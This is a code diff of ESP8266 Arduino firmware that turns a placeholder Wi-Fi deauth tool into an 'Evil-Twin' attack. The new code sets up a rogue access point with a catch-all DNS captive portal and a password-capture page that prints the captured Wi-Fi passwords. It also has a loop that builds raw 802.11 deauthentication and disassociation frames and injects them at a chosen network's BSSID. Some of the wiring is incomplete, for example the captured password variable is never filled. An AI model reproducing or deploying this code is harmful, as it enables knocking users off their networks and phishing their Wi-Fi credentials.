@@ -1,162 +1,177 @@
+#include <Arduino.h>
 #include <ESP8266WiFi.h>
+#include <DNSServer.h>
 #include <ESP8266WebServer.h>
-#include <LittleFS.h> // LittleFS
+#include <LittleFS.h> // Include LittleFS for file handling
 
-ESP8266WebServer server(80);
+extern "C" {
+#include "user_interface.h"
+}
 
-bool attackRunning = false;
-String targetSSID = "";
-int currentChannel = 1; // Channel for Wi-Fi operations
+typedef struct {
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+} _Network;
 
-// Access point structure
-struct AccessPoint {
-  String essid;
-  int channel;
-  uint8_t deauthPacket[26]; // Placeholder for deauth packet
-  bool found;
-};
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 1, 1);
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
 
-AccessPoint access_points[50]; // Array to store discovered APs
-int current = -1;
+_Network _networks[16];
+_Network _selectedNetwork;
+
+// Global variables
+String _correct = "";
+String _tryPassword = "";
+bool hotspot_active = false;  // Moved to global scope
+bool deauthing_active = false;
+unsigned long now = 0;
+unsigned long wifinow = 0;
+unsigned long deauth_now = 0;
 
 // Function prototypes
-void handleScan();
-void handleStartAttack();
-void handleStopAttack();
-void sendDeauth(String ssid);
-void scan();
-void promisc_cb(uint8_t* buf, uint16_t len);
-void clean_ap_list();
+void clearArray();
+void handleIndex();
+void handleResult();
+void handleAdmin();
+String readHTMLTemplate();
+String bytesToStr(const uint8_t* b, uint32_t size);
 
 void setup() {
   Serial.begin(115200);
+  WiFi.mode(WIFI_AP_STA);
+  wifi_promiscuous_enable(1);
 
+  // Initialize LittleFS to read HTML file
   if (!LittleFS.begin()) {
-    Serial.println("Failed to mount LittleFS!");
-  } else {
-    Serial.println("LittleFS mounted successfully!");
+    Serial.println("Failed to mount file system");
+    return;
   }
 
-  // Create Access Point
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP("PredX", "predx1337");
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  WiFi.softAP("Evil-Twin", "12345678");
+  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
-  // Web routes
-  server.on("/", HTTPMethod::HTTP_GET, []() {
-    File file = LittleFS.open("/index.html", "r");
-  
-    if (!file) {
-      Serial.println("Could not open file for read");
-      server.send(500, "application/json",
-                  "{\"error\":\"could not open file\"}");
-    } else {
-      server.streamFile(file, "text/html");
-      file.close();
+  webServer.on("/", handleIndex);
+  webServer.on("/result", handleResult);
+  webServer.on("/admin", handleAdmin);
+  webServer.onNotFound(handleIndex);
+  webServer.begin();
+}
+
+void clearArray() {
+  for (int i = 0; i < 16; i++) {
+    _Network _network;
+    _networks[i] = _network;
+  }
+}
+
+void performScan() {
+  int n = WiFi.scanNetworks();
+  clearArray();
+  if (n >= 0) {
+    for (int i = 0; i < n && i < 16; ++i) {
+      _Network network;
+      network.ssid = WiFi.SSID(i);
+      for (int j = 0; j < 6; j++) {
+        network.bssid[j] = WiFi.BSSID(i)[j];
+      }
+      network.ch = WiFi.channel(i);
+      _networks[i] = network;
     }
-  });
+  }
+}
 
-  server.on("/scan", HTTP_GET, handleScan);
-  server.on("/start", HTTP_GET, handleStartAttack);
-  server.on("/stop", HTTP_GET, handleStopAttack);
+void handleResult() {
+  if (WiFi.status() != WL_CONNECTED) {
+    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><body><h2>Wrong Password</h2><p>Please, try again.</p></body></html>");
+    Serial.println("Wrong password tried!");
+  } else {
+    webServer.send(200, "text/html", "<html><body><h2>Good password</h2></body></html>");
+    hotspot_active = false;  // Use the global variable
+    dnsServer.stop();
+    WiFi.softAP("Evil-Twin", "YellowPurple");
+    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
+    Serial.println("Good password was entered!");
+    Serial.println(_correct);
+  }
+}
 
-  server.begin();
-  Serial.println("Webserver started");
+void handleIndex() {
+  if (hotspot_active == false) {  // Use the global variable
+    String _html = readHTMLTemplate();
+    _html.replace("{success_message}", _correct.isEmpty() ? "" : "<h3>" + _correct + "</h3>");
+    webServer.send(200, "text/html", _html);
+  } else {
+    webServer.send(200, "text/html", "<html><body><form action='/'><label>Password:</label><input type='text' name='password'><input type='submit'></form></body></html>");
+  }
+}
+
+void handleAdmin() {
+  String _html = readHTMLTemplate();
+  webServer.send(200, "text/html", _html);
+}
+
+String readHTMLTemplate() {
+  File file = LittleFS.open("/index.html", "r");
+  if (!file) {
+    Serial.println("Failed to open HTML file");
+    return "";
+  }
+  String html = file.readString();
+  file.close();
+  return html;
+}
+
+String bytesToStr(const uint8_t* b, uint32_t size) {
+  String str;
+  const char ZERO = '0';
+  const char DOUBLEPOINT = ':';
+  for (uint32_t i = 0; i < size; i++) {
+    if (b[i] < 0x10) str += ZERO;
+    str += String(b[i], HEX);
+    if (i < size - 1) str += DOUBLEPOINT;
+  }
+  return str;
 }
 
 void loop() {
-  server.handleClient();
+  dnsServer.processNextRequest();
+  webServer.handleClient();
 
-  if (attackRunning) {
-    sendDeauth(targetSSID);
-    delay(100); // Little delay to avoid flooding
+  if (deauthing_active && millis() - deauth_now >= 1000) {
+    wifi_set_channel(_selectedNetwork.ch);
+
+    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
+
+    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
+    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
+    deauthPacket[24] = 1;
+
+    Serial.println(bytesToStr(deauthPacket, 26));
+    deauthPacket[0] = 0xC0;
+    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
+    Serial.println(bytesToStr(deauthPacket, 26));
+    deauthPacket[0] = 0xA0;
+    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
+
+    deauth_now = millis();
   }
-}
 
-// Function definitions
-void handleScan() {
-  scan(); // Perform a scan for access points
-  String list = "";
-  for (int i = 0; i <= current; ++i) {
-    list += "SSID: " + access_points[i].essid + ", Channel: " + String(access_points[i].channel) + "\n";
+  if (millis() - now >= 15000) {
+    performScan();
+    now = millis();
   }
-  server.send(200, "text/plain", list);
-}
 
-void handleStartAttack() {
-  if (server.hasArg("ssid")) {
-    targetSSID = server.arg("ssid");
-    attackRunning = true;
-    server.send(200, "text/plain", "Started attack on " + targetSSID);
-  } else {
-    server.send(400, "text/plain", "SSID not provided");
-  }
-}
-
-void handleStopAttack() {
-  attackRunning = false;
-  server.send(200, "text/plain", "Stopped attack");
-}
-
-void sendDeauth(String ssid) {
-  Serial.println("Sending deauth to: " + ssid);
-
-  // Find the target AP in the list
-  for (int i = 0; i <= current; i++) {
-    if (access_points[i].essid == ssid) {
-      // Send deauth packet (placeholder functionality)
-      Serial.print("Deauthenticating clients from AP: ");
-      Serial.print(access_points[i].essid);
-      Serial.print(" on channel ");
-      Serial.println(access_points[i].channel);
-      // Real deauth logic (e.g., packet injection) goes here
+  if (millis() - wifinow >= 2000) {
+    if (WiFi.status() != WL_CONNECTED) {
+      Serial.println("BAD");
+    } else {
+      Serial.println("GOOD");
     }
+    wifinow = millis();
   }
-}
-
-void scan() {
-  wifi_promiscuous_enable(0);
-  wifi_set_promiscuous_rx_cb(promisc_cb);
-  wifi_promiscuous_enable(1);
-  Serial.println("[!] Scanning for APs...");
-
-  for (int i = 0; i <= current; i++)
-    access_points[i].found = false;
-  
-  for (int i = 0; i < 2; i++) {
-    for (int p = 0; p < 13; p++) { // Wi-Fi channels 1-13
-      currentChannel = p + 1;
-      wifi_set_channel(currentChannel);
-      
-      Serial.print("Scanning channel: ");
-      Serial.println(currentChannel);
-      
-      delay(500); // Allow time for packet capture
-    }
-  }
-
-  Serial.println("[!] Done scanning");
-  clean_ap_list();
-  wifi_promiscuous_enable(0);
-  wifi_set_promiscuous_rx_cb(0);
-}
-
-// Promiscuous mode callback to process captured packets
-void promisc_cb(uint8_t* buf, uint16_t len) {
-  // Process packets to identify access points
-  // This function should parse beacon frames and extract SSIDs, channels, etc.
-  // Placeholder implementation
-  Serial.println("Packet received in promiscuous mode");
-}
-
-// Clean up AP list after scan
-void clean_ap_list() {
-  int index = 0;
-  for (int i = 0; i <= current; i++) {
-    if (access_points[i].found) {
-      access_points[index] = access_points[i];
-      index++;
-    }
-  }
-  current = index - 1;
-  Serial.println("Cleaned up AP list");
 }
